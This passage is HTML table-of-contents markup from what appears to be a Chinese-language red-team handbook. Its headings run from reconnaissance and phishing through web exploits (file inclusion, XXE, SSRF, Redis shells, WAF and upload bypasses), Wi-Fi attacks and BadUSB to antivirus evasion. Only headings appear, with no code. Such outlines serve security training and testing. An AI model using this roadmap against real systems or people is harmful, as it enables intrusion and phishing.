cdn常规方式</a></li></ul></li><li><a href="#%E5%9F%9F%E5%90%8D%E5%8E%86%E5%8F%B2ip">域名历史IP</a></li><li><a href="#%E7%BD%91%E7%AB%99%E6%9E%B6%E6%9E%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8C%87%E7%BA%B9cms%E8%AF%86%E5%88%AB%E5%AE%B9%E5%99%A8">网站架构/服务器指纹/CMS识别/容器</a></li><li><a href="#%E5%AD%90%E5%9F%9F%E5%90%8D">子域名</a></li><li><a href="#%E7%BD%91%E7%AB%99%E4%BD%BF%E7%94%A8%E7%9A%84cms%E7%9A%84%E5%AE%98%E6%96%B9demo%E7%AB%99">网站使用的CMS的官方demo站</a></li><li><a href="#ssl%E8%AF%81%E4%B9%A6%E4%BF%A1%E6%81%AF">SSL证书信息</a></li><li><a href="#dns%E5%8E%86%E5%8F%B2%E8%A7%A3%E6%9E%90%E8%AE%B0%E5%BD%95">DNS历史解析记录</a></li><li><a href="#%E5%90%8C%E6%9C%8D%E7%AB%99%E7%82%B9%E6%83%85%E5%86%B5">同服站点情况</a></li><li><a href="#%E5%90%8C%E6%A0%B7%E6%9E%B6%E6%9E%84%E6%88%96%E6%BA%90%E7%A0%81%E7%9A%84%E7%AB%99">同样架构或源码的站</a></li><li><a href="#%E7%BD%91%E7%AB%99js">网站js</a></li><li><a href="#%E7%BD%91%E7%AB%99%E4%BD%BF%E7%94%A8%E7%9A%84%E7%AC%AC%E4%B8%89%E6%96%B9js">网站使用的第三方js</a></li><li><a href="#%E4%BA%91%E4%BF%A1%E6%81%AF">云信息</a></li><li><a href="#app%E5%8F%8D%E7%BC%96%E8%AF%91">APP反编译</a></li><li><a href="#c%E6%AE%B5b%E6%AE%B5%E4%BF%A1%E6%81%AF">C段/B段信息</a></li><li><a href="#%E5%B7%A5%E5%85%B7">工具</a></li><li><a href="#%E7%AB%AF%E5%8F%A3%E5%AF%B9%E5%A4%96%E5%BC%80%E6%94%BE%E6%83%85%E5%86%B5">端口对外开放情况</a></li><li><a href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E7%88%AC%E8%99%AB%E6%85%8E%E7%94%A8">目录扫描/爬虫(慎用)</a></li><li><a href="#waf%E6%83%85%E5%86%B5%E8%AF%86%E5%88%AB">WAF情况识别</a></li><li><a href="#%E9%9A%8F%E6%89%8B%E6%B5%8B%E8%AF%95">随手测试</a></li><li><a href="#%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E">搜索引擎</a></li><li><a href="#shodanfofazoomeye">Shodan/fofa/zoomeye</a></li><li><a href="#google-dorks">Google dorks</a></li><li><a href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">信息泄露</a></li><li><a href="#%E7%BD%91%E9%A1%B5%E7%BC%93%E5%AD%98">网页缓存</a></li><li><a href="#%E5%9B%BE%E7%89%87%E5%8F%8D%E6%9F%A5">图片反查</a></li><li><a href="#%E7%A4%BE%E4%BA%A4">社交</a></li><li><a href="#%E6%89%8B%E6%9C%BA%E5%8F%B7%E5%8A%A0%E5%85%A5%E9%80%9A%E8%AE%AF%E5%BD%95%E5%8C%B9%E9%85%8D%E5%90%84%E4%B8%AAapp%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF">手机号加入通讯录匹配各个APP用户信息</a></li><li><a href="#%E6%B3%A8%E5%86%8C%E8%BF%87%E7%9A%84%E7%BD%91%E7%AB%99">注册过的网站</a></li><li><a href="#%E7%9B%AE%E6%A0%87%E4%BA%BA%E5%91%98%E7%9A%84%E5%85%B4%E8%B6%A3">目标人员的兴趣</a></li><li><a href="#%E9%82%AE%E7%AE%B1%E6%90%9C%E9%9B%86">邮箱搜集</a></li><li><a href="#exchange">Exchange</a></li><li><a href="#%E9%AA%8C%E8%AF%81%E9%82%AE%E7%AE%B1%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8">验证邮箱是否存在</a></li><li><a href="#%E5%8E%86%E5%8F%B2%E6%B3%84%E9%9C%B2%E8%BF%87%E7%9A%84%E8%B5%84%E6%96%99%E7%AD%89">历史泄露过的资料等</a></li><li><a href="#githubgitee%E7%AD%89%E4%BB%A3%E7%A0%81%E6%89%98%E7%AE%A1%E5%B9%B3%E5%8F%B0">Github/Gitee等代码托管平台</a></li><li><a href="#%E8%A2%AB%E5%85%A5%E4%BE%B5%E7%BD%91%E5%9D%80%E5%88%97%E8%A1%A8">被入侵网址列表</a></li><li><a href="#gps%E6%9F%A5%E8%AF%A2">GPS查询</a></li><li><a href="#%E7%BD%91%E7%AB%99url%E6%8F%90%E5%8F%96">网站URL提取</a></li><li><a href="#%E8%9C%9C%E7%BD%90%E5%88%A4%E6%96%AD%E5%8F%82%E8%80%83%E4%B8%80%E4%B8%8B%E5%8D%B3%E5%8F%AF">蜜罐判断(参考一下即可)</a></li><li><a href="#%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81">默认密码</a></li><li><a href="#%E5%A6%82%E9%9C%80%E6%B3%A8%E5%86%8C">如需注册</a></li><li><a href="#%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF">企业信息</a></li></ul></li><li><p><a href="#%E5%85%A5%E5%8F%A3%E7%82%B9">入口点</a></p><ul><li><a href="#win10-%E5%AE%89%E8%A3%85kaliwsl">win10 安装kali(wsl)</a></li><li><a href="#%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB">水坑攻击</a><ul><li><a href="#xss%E5%85%8B%E9%9A%86%E9%92%93%E9%B1%BC">XSS克隆钓鱼</a></li><li><a href="#%E4%BC%AA%E9%80%A0%E9%A1%B5%E9%9D%A2%E9%92%93%E9%B1%BC">伪造页面钓鱼</a><ul><li><a href="#1">1</a></li><li><a href="#2">2</a></li></ul></li></ul></li><li><a href="#%E5%AF%B9%E5%A4%96%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB">对外服务攻击</a><ul><li><a href="#web">Web</a><ul><li><a href="#%E5%89%8D%E7%AB%AF%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E">前端/逻辑漏洞</a><ul><li><a href="#%E6%B3%A8%E5%86%8C">注册</a></li><li><a href="#%E7%99%BB%E5%BD%95">登录</a></li><li><a href="#%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE">任意密码重置</a></li><li><a href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">信息泄露</a></li><li><a href="#%E5%90%8E%E5%8F%B0">后台</a></li></ul></li><li><a href="#jwt%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95">JWT攻击手法</a><ul><li><a href="#%E6%9C%AA%E6%A0%A1%E9%AA%8C%E7%AD%BE%E5%90%8D">未校验签名</a></li><li><a href="#%E7%A6%81%E7%94%A8%E5%93%88%E5%B8%8C">禁用哈希</a></li><li><a href="#%E6%9A%B4%E7%A0%B4%E5%BC%B1%E5%AF%86%E9%92%A5">暴破弱密钥</a></li></ul></li><li><a href="#xss">XSS</a></li><li><a href="#csrf">CSRF</a></li><li><a href="#php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8B%E8%BD%BD">php任意文件读取/下载</a></li><li><a href="#php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">php文件包含</a><ul><li><a href="#%E5%B8%B8%E7%94%A8%E5%8D%8F%E8%AE%AE">常用协议</a></li><li><a href="#getshell">Getshell</a><ul><li><a href="#allow_url_include-%E5%BC%80%E5%90%AF%E6%97%B6getshell">allow_url_include 开启时Getshell</a></li><li><a href="#allow_url_include-%E5%85%B3%E9%97%AD%E6%97%B6getshell">allow_url_include 关闭时Getshell</a></li><li><a href="#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6getshell">包含日志文件getshell</a></li><li><a href="#%E4%B8%8A%E4%BC%A0%E4%B8%AA%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F%E7%9A%84%E6%9C%A8%E9%A9%AC%E7%9B%B4%E6%8E%A5%E5%8C%85%E5%90%AB">上传个图片格式的木马直接包含</a></li><li><a href="#%E9%99%90%E5%88%B6%E5%90%8E%E7%BC%80%E6%97%B6">限制后缀时</a></li><li><a href="#phpinfo-lfi-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6getshell">phpinfo-LFI 本地文件包含临时文件getshell</a></li><li><a href="#session--lfi-getshell">session + lfi getshell</a></li><li><a href="#lfi-ssh-log">LFI SSH Log</a></li><li><a href="#rfi%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8A%E7%BA%BFmsf">RFI&amp;命令注入上线MSF</a></li></ul></li></ul></li><li><a href="#xml">XML</a><ul><li><a href="#xml%E6%B3%A8%E5%85%A5">XML注入</a></li><li><a href="#xxe">XXE</a><ul><li><a href="#%E5%88%A4%E6%96%AD">判断</a></li><li><a href="#%E6%8C%96%E6%8E%98">挖掘</a></li><li><a href="#%E6%9C%89%E5%9B%9E%E6%98%BE%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6">有回显读取本地文件</a></li><li><a href="#blind-oob-xxe%E6%97%A0%E5%9B%9E%E6%98%BE%E8%AF%BB%E5%8F%96">Blind OOB XXE无回显读取</a></li><li><a href="#%E5%88%97%E7%9B%AE%E5%BD%95">列目录</a></li><li><a href="#%E4%B8%8D%E5%90%8C%E5%B9%B3%E5%8F%B0%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE">不同平台支持的协议</a></li><li><a href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4">执行命令</a></li><li><a href="#%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B">内网主机探测</a></li><li><a href="#%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">内网端口扫描</a></li><li><a href="#%E5%86%85%E9%83%A8dtd%E5%88%A9%E7%94%A8">内部DTD利用</a></li><li><a href="#linux">Linux</a></li><li><a href="#windows">Windows</a></li><li><a href="#xxe%E5%86%99shell">XXE写shell</a></li></ul></li></ul></li><li><a href="#ssrf">SSRF</a><ul><li><a href="#%E5%AE%9A%E4%B9%89">定义</a></li><li><a href="#%E6%88%90%E5%9B%A0">成因</a></li><li><a href="#%E6%8C%96%E6%8E%98">挖掘</a><ul><li><a href="#xml">XML</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93">数据库</a></li><li><a href="#mongodb">MongoDB</a></li><li><a href="#postgressql">PostgresSQL</a></li><li><a href="#mssql">MSSQL</a></li><li><a href="#%E5%9B%BE%E7%89%87%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0">图片处理函数</a></li></ul></li><li><a href="#%E6%94%BB%E5%87%BB">攻击</a><ul><li><a href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96">文件读取</a></li></ul></li><li><a href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B">端口探测</a><ul><li><a href="#ssrfredis">SSRF+Redis</a></li><li><a href="#302%E5%8F%8D%E5%BC%B9shell">302反弹shell</a></li><li><a href="#mysql">Mysql</a></li><li><a href="#weblogic-ssrfredis">Weblogic SSRF+Redis</a></li><li><a href="#ueditor-ssrf">Ueditor SSRF</a></li><li><a href="#discuz">Discuz</a></li><li><a href="#%E6%8E%A2%E6%B5%8B%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA">探测存活主机</a></li><li><a href="#%E5%86%85%E5%A4%96%E7%BD%91%E8%B5%84%E4%BA%A7%E5%AF%B9%E5%BA%94">内外网资产对应</a></li><li><a href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95">绕过方法</a></li><li><a href="#gopher%E5%8D%8F%E8%AE%AE%E7%9A%84%E8%84%9A%E6%9C%AC%E8%BD%AC%E6%8D%A2">gopher协议的脚本转换</a></li><li><a href="#%E5%8D%8F%E8%AE%AE">协议</a></li><li><a href="#dict%E5%8D%8F%E8%AE%AE%E5%86%99shell">dict协议写shell</a></li><li><a href="#slaveof%E5%A4%8D%E5%88%B6shell%E5%88%B0%E7%9B%AE%E6%A0%87">slaveof复制shell到目标</a></li><li><a href="#slaveof%E5%8F%8D%E5%BC%B9shell">slaveof反弹shell</a></li></ul></li></ul></li><li><a href="#fuzz%E6%89%AB%E6%8F%8Fweb">Fuzz/扫描web </a><ul><li><a href="#wfuzz">WFuzz</a></li><li><a href="#cewl">Cewl</a></li><li><a href="#dirsearch">Dirsearch</a></li></ul></li><li><a href="#bypass-waf">Bypass WAF</a><ul><li><a href="#sql%E6%B3%A8%E5%85%A5%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93">SQL注入分块传输</a></li><li><a href="#%E8%87%AA%E5%8A%A8%E6%8F%90%E4%BE%9B%E5%8F%AF%E7%94%A8%E7%9A%84tamper">自动提供可用的tamper</a></li><li><a href="#%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE">垃圾数据</a></li><li><a href="#%E4%B8%8A%E4%BC%A0bypass">上传bypass</a><ul><li><a href="#%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%E5%A4%B4">图片文件头</a></li><li><a href="#%E6%B7%BB%E5%8A%A0%E5%9B%BE%E7%89%87%E5%A4%B4%E6%88%96%E5%90%88%E5%B9%B6%E5%9B%BE%E7%89%87%E5%8C%85%E5%90%AB">添加图片头或合并图片包含</a></li><li><a href="#%E5%90%8E%E7%BC%80%E5%A4%A7%E5%B0%8F%E5%86%99">后缀大小写</a></li><li><a href="#%E6%96%87%E4%BB%B6%E5%90%8D%E5%89%8D%E7%BC%80%E5%8A%A00x09">文件名前缀加[0x09]</a></li><li><a href="#%E4%B8%8A%E4%BC%A0htaccess">上传.htaccess</a></li><li><a href="#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93">二次渲染</a></li><li><a href="#%E4%B8%8A%E4%BC%A0php3php4phtml%E7%AD%89">上传php3,php4,phtml等</a></li><li><a href="#%E6%96%87%E4%BB%B6%E5%90%8D%E5%90%8E%E5%8A%A0data">文件名后加::$DATA</a></li><li><a href="#asp--%E7%A9%BA%E6%A0%BC">asp . (空格+.)</a></li><li><a href="#php-%E7%82%B9%E7%A9%BA%E6%A0%BC%E7%82%B9">php. .(点+空格+点)</a>)</li><li><a href="#%E5%8F%8C%E5%86%99phphpp">双写phphpp</a></li><li><a href="#00%E6%88%AA%E6%96%AD">00截断</a></li><li><a href="#%E4%BF%AE%E6%94%B9%E4%B8%80%E4%BA%9B%E5%9B%BA%E5%AE%9A%E7%9A%84%E5%8F%82%E6%95%B0">修改一些固定的参数</a></li><li><a href="#%E6%96%87%E4%BB%B6%E5%90%8D%E5%8E%BB%E6%8E%89%E5%8F%8C%E5%BC%95%E5%8F%B7">文件名去掉双引号</a></li><li><a href="#%E5%8A%A0%E4%B8%80%E4%B8%AAfilename1%E7%9A%84%E5%8F%82%E6%95%B0">加一个filename1的参数</a></li><li><a href="#form%E5%8F%98%E9%87%8F%E6%94%B9%E6%88%90form">form变量改成f+orm</a></li><li><a href="#%E5%8E%BB%E6%8E%89form-data">去掉form-data</a></li><li><a href="#%E5%9C%A8content-disposition%E6%88%96form-data%E5%90%8E%E6%B7%BB%E5%8A%A0%E5%A4%9A%E4%B8%AA%E7%A9%BA%E6%A0%BC">在Content-Disposition或form-data;后添加多个空格</a></li><li><a href="#%E5%BC%95%E5%8F%B7%E5%9B%9E%E8%BD%A6">引号回车</a></li><li><a href="#content-type%E5%92%8Ccontent-disposition%E8%B0%83%E6%8D%A2%E4%BD%8D%E7%BD%AE">Content-Type和ConTent-Disposition调换位置</a></li><li><a href="#%E6%96%87%E4%BB%B6%E5%90%8D%E5%89%8D%E7%BC%80%E5%8A%A0%E7%A9%BA%E6%A0%BC">文件名前缀加空格</a></li><li><a href="#name%E5%89%8D%E5%8A%A0%E7%A9%BA%E6%A0%BC">name前加空格</a></li><li><a href="#form-data%E7%9A%84%E5%89%8D%E5%90%8E%E5%8A%A0%E4%B8%8A">form-data的前后加上+</a></li></ul></li><li><a href="#aspiis">ASP+IIS</a></li><li><a href="#aspiisaspxiis">Asp+iis&amp;aspx+iis</a></li><li><a href="#apache">apache</a></li><li><a href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E5%85%B3%E9%94%AE%E5%AD%97">大小写/关键字</a></li><li><a href="#%E5%8F%8C%E9%87%8Durl%E7%BC%96%E7%A0%81">双重url编码</a></li><li><a href="#%E5%8F%98%E6%8D%A2%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F">变换请求方式</a></li><li><a href="#hpp%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93">HPP参数污染</a></li><li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93">数据库</a><ul><li><a href="#access">Access</a></li><li><a href="#mysql">Mysql</a></li><li><a href="#mssql">MSSQL</a></li></ul></li><li><a href="#waf">WAF</a></li></ul></li><li><a href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">未授权访问</a><ul><li><a href="#redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">Redis未授权访问</a><ul><li><a href="#%E6%B5%8B%E8%AF%95">测试</a></li><li><a href="#js%E6%89%93%E5%86%85%E7%BD%91">JS打内网</a></li><li><a href="#%E5%8F%8D%E5%BC%B9shell">反弹shell</a></li><li><a href="#%E5%86%99shell">写shell</a></li><li><a href="#ssh">SSH</a></li><li><a href="#redis-rogue-getshell">redis-rogue-getshell</a></li><li><a href="#redis-rogue-server">redis-rogue-server</a></li><li><a href="#redis%E5%9C%A8windows%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8">redis在windows下的利用</a></li><li><a href="#lua-rce">Lua RCE</a></li></ul></li><li><a href="#jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">Jenkins未授权访问</a></li><li><a href="#mongodb%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">MongoDB未授权访问</a></li><li><a href="#zookeeper%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">ZooKeeper未授权访问</a></li><li><a href="#elasticsearch%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">Elasticsearch未授权访问</a></li><li><a href="#memcache%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">Memcache未授权访问</a></li><li><a href="#hadoop%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">Hadoop未授权访问</a></li><li><a href="#docker%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">Docker未授权访问</a></li><li><a href="#activemq%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">ActiveMQ未授权访问</a></li><li><a href="#jboss%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE">JBOSS未授权访问</a></li></ul></li><li><a href="#%E9%98%BF%E9%87%8C%E4%BA%91oss-key%E5%88%A9%E7%94%A8">阿里云OSS Key利用</a></li><li><a href="#linux%E7%BB%95%E8%BF%87disable_function">Linux绕过disable_function</a><ul><li><a href="#ld_preload">LD_PRELOAD</a></li><li><a href="#php70-73-bypass">php7.0-7.3 bypass</a></li><li><a href="#windows%E7%B3%BB%E7%BB%9F%E7%BB%84%E4%BB%B6com%E7%BB%95%E8%BF%87">windows系统组件com绕过</a></li><li><a href="#cgi%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F">CGI启动方式</a></li><li><a href="#imagemagick%E7%BB%84%E4%BB%B6%E7%BB%95%E8%BF%87">ImageMagick组件绕过</a></li><li><a href="#%E5%B8%B8%E8%A7%84%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87">常规函数绕过</a></li><li><a href="#pcntl_exec">pcntl_exec</a></li><li><a href="#imap_open%E5%87%BD%E6%95%B0">imap_open函数</a></li><li><a href="#php74-ffi%E7%BB%95%E8%BF%87">php7.4 FFI绕过</a></li><li><a href="#shellshock">shellshock</a></li><li><a href="#%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6">蚁剑插件</a></li></ul></li><li><a href="#open_basedir%E7%BB%95%E8%BF%87">open_basedir绕过</a></li><li><a href="#tomcat-ajp-lfirce">Tomcat Ajp LFI&amp;RCE    </a></li><li><a href="#mysql%E8%BF%9E%E6%8E%A5%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96">Mysql连接文件读取</a></li><li><a href="#mysql%E5%BC%80%E5%90%AF%E5%A4%96%E8%BF%9E">Mysql开启外连</a></li><li><a href="#mssqlagent-job%E4%B8%8A%E7%BA%BF">MSSQL&amp;Agent Job上线</a></li><li><a href="#%E6%B3%A8%E5%85%A5%E6%97%A0%E5%88%97%E5%90%8D">注入无列名</a></li><li><a href="#dnslog">DNSLog</a><ul><li><a href="#%E6%B3%A8%E5%85%A5">注入</a><ul><li><a href="#mysql">MYSQL</a></li><li><a href="#mssql">MSSQL</a></li><li><a href="#postgresql">postgreSQL</a></li><li><a href="#oracle">Oracle</a></li></ul></li><li><a href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">命令执行</a></li><li><a href="#xxe">XXE</a></li><li><a href="#struts">Struts</a></li><li><a href="#weblogic">weblogic</a></li><li><a href="#resin">Resin</a></li><li><a href="#discuz">Discuz</a></li></ul></li><li><a href="#phpmyadmin">PHPMyadmin</a><ul><li><a href="#log">LOG</a></li><li><a href="#%E6%85%A2%E6%9F%A5%E8%AF%A2">慢查询</a></li><li><a href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96">任意文件读取</a></li><li><a href="#lfi">LFI</a></li><li><a href="#rce">RCE</a></li></ul></li><li><a href="#php-fpm-rce">PHP-FPM RCE</a></li><li><a href="#phpstudy%E5%90%8E%E9%97%A8">phpstudy后门</a></li><li><a href="#cmdhijack">cmdhijack</a></li></ul></li><li><a href="#database">Database</a><ul><li><a href="#mssql">MSSQL</a></li><li><a href="#postgresql">PostgreSQL</a></li></ul></li></ul></li><li><a href="#%E8%BF%91%E6%BA%90%E6%94%BB%E5%87%BB">近源攻击</a><ul><li><a href="#wi-fi%E7%A0%B4%E8%A7%A3">WI-FI破解</a><ul><li><a href="#wifite">wifite</a></li><li><a href="#aircrack-ng">Aircrack-ng</a></li></ul></li><li><a href="#%E9%92%93%E9%B1%BC%E7%BD%91%E7%BB%9C">钓鱼网络</a><ul><li><a href="#hostapd">Hostapd</a></li><li><a href="#hostapd-wpe">Hostapd-wpe</a></li></ul></li><li><a href="#%E6%97%A0%E7%BA%BF%E5%B9%B2%E6%89%B0">无线干扰</a><ul><li><a href="#beacon-flood">Beacon flood</a></li><li><a href="#deauth-flood">Deauth flood</a></li><li><a href="#mdk3-destruction">Mdk3 destruction</a></li><li><a href="#wifi%E8%8A%AF%E7%89%87esp8266">WiFi芯片esp8266</a></li><li><a href="#mdk4">Mdk4</a></li><li><a href="#cve-2018-4407">CVE-2018-4407</a></li><li><a href="#%E7%BB%95%E8%BF%87mac%E5%9C%B0%E5%9D%80%E8%AE%A4%E8%AF%81">绕过mac地址认证</a><ul><li><a href="#ifconfig">Ifconfig</a></li><li><a href="#macchanger">Macchanger</a></li></ul></li></ul></li><li><a href="#badusb">BadUSB</a></li><li><a href="#%E5%85%8B%E9%9A%86%E5%8D%A1">克隆卡</a></li><li><a href="#%E8%93%9D%E7%89%99">蓝牙</a></li></ul></li><li><a href="#%E9%B1%BC%E5%8F%89%E5%BC%8F%E6%94%BB%E5%87%BB">鱼叉式攻击</a><ul><li><a href="#%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6">钓鱼邮件</a><ul><li><a href="#cve">CVE</a><ul><li><a href="#cve-2017-11882">CVE-2017-11882</a></li><li><a href="#cve-2017-0199">CVE-2017-0199</a></li><li><a href="#cve-2012-0158">CVE-2012-0158</a></li><li><a href="#cve-2017-0143">CVE-2017-0143</a></li></ul></li><li><a href="#%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6">可执行文件</a></li><li><a href="#%E6%96%87%E6%A1%A3%E6%96%87%E4%BB%B6%E7%9A%84%E4%BC%AA%E9%80%A0">文档文件的伪造</a></li><li><a href="#%E6%89%A9%E5%B1%95%E5%90%8D%E5%9B%BE%E6%A0%87">扩展名/图标</a></li><li><a href="#%E6%8D%86%E7%BB%91">捆绑</a></li><li><a href="#%E5%AE%8F">宏</a></li><li><a href="#0day">0day</a></li><li><a href="#chm">CHM</a></li></ul></li><li><a href="#%E9%92%93%E9%B1%BC%E9%93%BE%E6%8E%A5">钓鱼链接</a><ul><li><a href="#url%E8%B7%B3%E8%BD%AC">URL跳转</a></li><li><a href="#%E7%BB%93%E5%90%88%E6%81%B6%E6%84%8F%E6%96%87%E6%A1%A3%E6%88%96%E7%A8%8B%E5%BA%8F">结合恶意文档或程序</a></li><li><a href="#%E7%9F%ADurl">短URL</a></li><li><a href="#%E7%BB%93%E5%90%88%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB">结合水坑攻击</a></li><li><a href="#%E7%9B%B8%E4%BC%BC%E5%9F%9F%E5%90%8D">相似域名</a></li><li><a href="#%E5%9F%9F%E5%90%8D%E7%AA%83%E5%8F%96">域名窃取</a></li></ul></li><li><a href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8A%A1%E9%B1%BC%E5%8F%89">第三方服务鱼叉</a></li></ul></li></ul></li><li><p><a href="#%E5%85%8D%E6%9D%80">免杀</a></p><ul><li><a href="#msf%E5%85%8D%E6%9D%80">MSF免杀</a><ul><li><a href="#nps_payload">nps_payload</a></li><li><a href="#%E7%BC%96%E7%A0%81%E5%99%A8">编码器</a></li><li><a href="#cc%E6%BA%90%E7%A0%81%E5%85%8D%E6%9D%80">c/c++源码免杀</a><ul><li><a href="#%E6%8C%87%E9%92%88%E6%89%A7%E8%A1%8C">指针执行</a></li><li><a href="#%E7%94%B3%E8%AF%B7%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98">申请动态内存</a></li><li><a href="#%E5%B5%8C%E5%85%A5%E6%B1%87%E7%BC%96">嵌入汇编</a></li><li><a href="#%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2">强制类型转换</a></li><li><a href="#%E6%B1%87%E7%BC%96%E8%8A%B1%E6%8C%87%E4%BB%A4">汇编花指令</a></li><li><a href="#xor%E5%8A%A0%E5%AF%86">XOR加密</a></li><li><a href="#%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5">远程线程注入</a></li><li><a href="#%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%85%8D%E6%9D%80">加载器免杀</a><ul><li><a href="#shellcode_launcher">shellcode_launcher</a></li><li><a href="#ssi%E5%8A%A0%E8%BD%BD">SSI加载</a></li></ul></li></ul></li><li><a href="#c%E6%BA%90%E7%A0%81%E5%85%8D%E6%9D%80">c#源码免杀</a><ul><li><a href="#%E7%9B%B4%E6%8E%A5%E7%BC%96%E8%AF%91">直接编译</a></li><li><a href="#%E5%8A%A0%E5%AF%86%E5%A4%84%E7%90%86">加密处理</a></li><li><a href="#xoraes%E7%BC%96%E7%A0%81">XOR/AES编码</a></li><li><a href="#cscinstallutil">CSC+InstallUtil</a></li></ul></li><li><a href="#python%E6%BA%90%E7%A0%81%E5%85%8D%E6%9D%80">Python源码免杀</a><ul><li><a href="#pyinstaller%E5%8A%A0%E8%BD%BDc%E4%BB%A3%E7%A0%81%E7%BC%96%E8%AF%91">pyinstaller加载C代码编译</a></li><li><a href="#pyinstaller%E5%8A%A0%E8%BD%BDpy%E4%BB%A3%E7%A0%81%E7%BC%96%E8%AF%91">pyinstaller加载py代码编译(*)</a></li><li><a href="#py2exe%E6%89%93%E5%8C%85exe">Py2exe打包exe</a></li><li><a href="#base64%E7%BC%96%E7%A0%81pyinstaller%E6%89%93%E5%8C%85">Base64编码+Pyinstaller打包</a></li><li><a href="#%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%88%86%E7%A6%BB">加载器分离</a><ul><li><a href="#hex">hex</a></li><li><a href="#base64">Base64(*)</a></li></ul></li></ul></li><li><a href="#dll%E5%8A%AB%E6%8C%81">DLL劫持</a></li><li><a href="#msbuild">MSBuild</a></li><li><a href="#greatsct">GreatSCT</a></li><li><a href="#mshta">Mshta</a></li><li><a href="#installutil">InstallUtil</a></li><li><a href="#veil">Veil</a></li><li><a href="#rc4">RC4</a></li><li><a href="#%E6%8D%86%E7%BB%91">捆绑</a></li><li><a href="#evasion%E6%A8%A1%E5%9D%97">Evasion模块</a></li><li><a href="#phantom-evasion">Phantom-Evasion</a></li><li><a href="#shellter">Shellter</a></li><li><a href="#the-backdoor-factory">the-backdoor-factory</a></li><li><a href="#zirikatu">zirikatu</a></li><li><a href="#hanzoinjection">hanzoInjection</a></li></ul></li><li><a href="#powershell%E5%85%8D%E6%9D%80">PowerShell免杀</a><ul><li><a href="#%E7%9B%B4%E6%8E%A5%E7%94%9F%E6%88%90">直接生成</a></li><li><a href="#%E5%88%86%E5%9D%97%E5%85%8D%E6%9D%80">分块免杀</a></li><li><a href="#invoke-shellcode%E5%8A%A0%E8%BD%BD">Invoke-Shellcode加载</a></li><li><a 